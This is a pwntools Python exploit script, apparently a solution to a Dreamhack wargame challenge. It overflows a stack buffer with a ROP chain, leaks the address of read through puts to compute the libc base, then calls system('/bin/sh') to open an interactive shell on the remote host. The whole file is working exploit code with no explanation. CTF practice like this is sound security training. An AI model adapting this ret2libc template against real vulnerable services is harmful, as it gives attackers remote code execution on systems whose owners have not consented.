from pwn import *

conn = remote("host3.dreamhack.games", 13559);
libc=ELF('./libc.so.6')


rdi_ret = 0x400883
read_got = 0x601030
puts_plt = 0x4005c0

func_main = 0x4007ba

payload = b'A'*(0x48)
payload += p64(rdi_ret)
payload += p64(read_got)
payload += p64(puts_plt)
payload += p64(func_main)


conn.send(payload)

sleep(1)

print(conn.recvuntil('A'*0x40))

leak = u64(conn.recv(6)+b'\x00\x00')
print("leak => "+str(hex(leak)))

libcbase = leak - libc.sym['read']
print("libcbase => "+str(hex(libcbase)))

system = libcbase+libc.sym['system']
print("system => "+str(hex(system)))

binsh = libcbase+list(libc.search(b"/bin/sh"))[0]
print("binsh => "+str(hex(binsh)))

payload2 = b'B'*0x48
payload2 += p64(rdi_ret)
payload2 += p64(binsh)
payload2 += p64(system)

conn.send(payload2)
conn.interactive()